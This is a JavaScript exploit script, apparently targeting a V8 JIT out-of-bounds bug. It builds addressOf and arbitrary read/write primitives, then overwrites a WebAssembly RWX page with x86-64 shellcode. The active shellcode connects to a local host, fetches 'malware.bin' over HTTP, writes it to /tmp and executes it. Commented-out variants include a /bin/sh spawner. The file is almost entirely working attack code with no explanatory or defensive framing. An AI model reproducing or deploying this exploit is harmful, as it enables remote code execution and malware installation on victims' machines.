var fi_buf = new ArrayBuffer(8);
var f_buf = new Float64Array(fi_buf);
var i_buf = new BigUint64Array(fi_buf);

function f2i(value) {
	f_buf[0] = value;
	return i_buf[0];
}

function i2f(value) {
	i_buf[0] = value;
	return f_buf[0];
}


function fun(arg) {
  let x = arguments.length;
  a1 = new Array(0x10);
  a1[0] = 1.1;
  a2 = new Array(0x10);
  a2[0] = 1.1;
  a1[(x >> 16) * 21] = 1.39064994160909e-309;  // 0xffff00000000
  a1[(x >> 16) * 41] = 1.39064994160909e-309;  // 0xffff00000000
}

var a1, a2;
var a3 = [1.1,2.2];
a3.length = 0x11000;

for (let i = 0; i < 100000; i++) fun(1);
//%OptimizeFunctionOnNextCall(fun);

fun(...a3);

//console.log(a2.length);
//%DebugPrint(a1);
//%DebugPrint(a2);
//%SystemBreak();



var objLeak = {'leak': 0x1234, 'tag': 0x4567};
var offset_leak = 0;
for (let i = 0; i < 0xffff; i++) {
	if (f2i(a2[i]) == 0x456700000000) {
		offset_leak = i - 1;
		break;
	}
}

console.log('offset_leak = ' + offset_leak);

function addressOf(obj) {
	objLeak.leak = obj;
	return f2i(a2[offset_leak]);
}


var objTest = {'aaa': 123};


//%DebugPrint(objTest);
console.log('addressOf(objTest) = 0x' + addressOf(objTest).toString(16));
//%SystemBreak();


var buf2write = new ArrayBuffer(0xbeef);
var data_view = new DataView(buf2write);
var offset_backing_store = 0;

//%DebugPrint(buf2write);
//%SystemBreak();


for (let i = 0; i < 0xffff; i++) {
	if (f2i(a2[i]) == 0xbeef) {
		offset_backing_store = i + 1;
		break;
	}
}



function write64(addr, value) {
	a2[offset_backing_store] = i2f(addr);
	data_view.setFloat64(0, i2f(value), true);
}

function read64(addr) {
	a2[offset_backing_store] = i2f(addr);
	return f2i(data_view.getFloat64(0, true));
}



write64(addressOf(objTest) + 0x18n - 1n, 0x2333n);
//%DebugPrint(objTest);

console.log('value = 0x' + read64(addressOf(objTest) + 0x18n - 1n).toString(16));
//%SystemBreak();


var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);

var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var f = wasmInstance.exports.main;

//%DebugPrint(f);
//%SystemBreak();



var f_addr = addressOf(f) - 1n;
var shared_info_addr = read64(f_addr + 0x18n) - 1n;
var data_addr = read64(shared_info_addr + 0x8n) - 1n;
var instance_addr = read64(data_addr + 0x10n) - 1n;
var rwx_page_addr = read64(instance_addr + 0xe8n);

/*
var sc_arr = [
    0x10101010101b848n,    0x62792eb848500101n,    0x431480101626d60n,    0x2f7273752fb84824n,
    0x48e78948506e6962n,    0x1010101010101b8n,    0x6d606279b8485001n,    0x2404314801010162n,
    0x1485e086a56f631n,    0x313b68e6894856e6n,    0x101012434810101n,    0x4c50534944b84801n,
    0x6a52d231503d5941n,    0x894852e201485a08n,    0x50f583b6ae2n,
]
*/


// 0x48, 0x31, 0xf6, 0x56, 0x48, 0xbf, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68, 0x57, 0x54, 0x5f, 0x6a, 0x3b, 0x58, 0x99, 0x0f, 0x05
// var sc_arr = [0x622fbf4856f63148n, 0x545768732f2f6e69n, 0x050f99583b6a5fn]
//var sc_arr = [0x18ec8148e5894855n, 0x00000002bf000008n, 0x48d23100000001ben, 0x050f00000029c0c7n, 0x000001bf00f88348n, 0x480000017f8c0f00n, 0x0004472668fc4589n, 0xc748f63148e78948n, 0x59050f0000013fc0n, 0x0000040024848948n, 0x06c7c748fff88348n, 0x00014d840f000000n, 0x00080424bc8d4800n, 0xc766000207c76600n, 0x7f0447c7401f0247n, 0x8d48fc7d8b010000n, 0x10ba0000080424b4n, 0x002ac0c748000000n, 0x00f88348050f0000n, 0x0b8c0f00000002bfn, 0xbe48fc7d8b000001n, 0x0000000a0d0a0d31n, 0x5054544820be4856n, 0x6177be48562e312fn, 0x48566e69622e6572n, 0x616d2f20544547ben, 0x001ebae68948566cn, 0xc0314dd2314d0000n, 0x002cc0c748c9314dn, 0x59595959050f0000n, 0x000003bf00f88348n, 0x4c000000af8c0f00n, 0xbc41fffffbf0ad8dn, 0x4cfc7d8b0a0d0a0dn, 0x4d00000001baee89n, 0xc9314dc0314dd231n, 0x0f0000002dc0c748n, 0x440b7e00f8834805n, 0xc5ff490574fd6639n, 0xfffbf0ad8d4cd2ebn, 0xbaee894cfc7d8bffn, 0x4dd2314d00000001n, 0xc0c748c9314dc031n, 0x8348050f0000002dn, 0x24bc8b481d7e00f8n, 0x48ee894c00000400n, 0xc74800000001c2c7n, 0xeb050f00000001c0n, 0x00040024bc8b48c0n, 0x3148e68948006a00n, 0x49d2314dc93148d2n, 0xc74800001000c0c7n, 0x48050f00000142c0n, 0x814800000005c7c7n, 0xec894800000818c4n, 0x0000003cc0c7485dn, 0x050fn]
var sc_arr = [0x18ec8148e5894855n, 0x00000002bf000008n, 0x48d23100000001ben, 0x050f00000029c0c7n, 0x000001bf00f88348n, 0x48000001ad8c0f00n, 0x77be48006afc4589n, 0x566e69622e657261n, 0x6d2f706d742fbe48n, 0xc748e78948566c61n, 0xc0c748000001c0c6n, 0x5959050f00000055n, 0x0004002484894859n, 0xc7c748fff8834800n, 0x0162840f00000006n, 0x080424bc8d480000n, 0x66000207c7660000n, 0x0447c7401f0247c7n, 0x48fc7d8b0100007fn, 0xba0000080424b48dn, 0x2ac0c74800000010n, 0xf88348050f000000n, 0x8c0f00000002bf00n, 0x48fc7d8b00000120n, 0x00000a0d0a0d31ben, 0x54544820be485600n, 0x77be48562e312f50n, 0x566e69622e657261n, 0x6d2f20544547be48n, 0x1ebae68948566c61n, 0x314dd2314d000000n, 0x2cc0c748c9314dc0n, 0x595959050f000000n, 0x0003bf00f8834859n, 0x000000c48c0f0000n, 0x41fffffbf0ad8d4cn, 0xfc7d8b0a0d0a0dbcn, 0x00000001baee894cn, 0x314dc0314dd2314dn, 0x0000002dc0c748c9n, 0x0b7e00f88348050fn, 0xff490574fd663944n, 0xfbf0ad8d4cd2ebc5n, 0xee894cfc7d8bffffn, 0xd2314d00000001ban, 0xc748c9314dc0314dn, 0x48050f0000002dc0n, 0xbc8b481d7e00f883n, 0xee894c0000040024n, 0x4800000001c2c748n, 0x050f00000001c0c7n, 0x040024bc8b48c0ebn, 0x000003c0c7480000n, 0x77be48006a050f00n, 0x566e69622e657261n, 0x6d2f706d742fbe48n, 0x3148e78948566c61n, 0x3bc0c748d23148f6n, 0xc7c748050f000000n, 0x18c4814800000005n, 0x485dec8948000008n, 0x050f0000003cc0c7n]

for (let i = 0n; i < sc_arr.length; i++) {
	write64(rwx_page_addr + i * 8n, sc_arr[i]);
}

console.log(f());
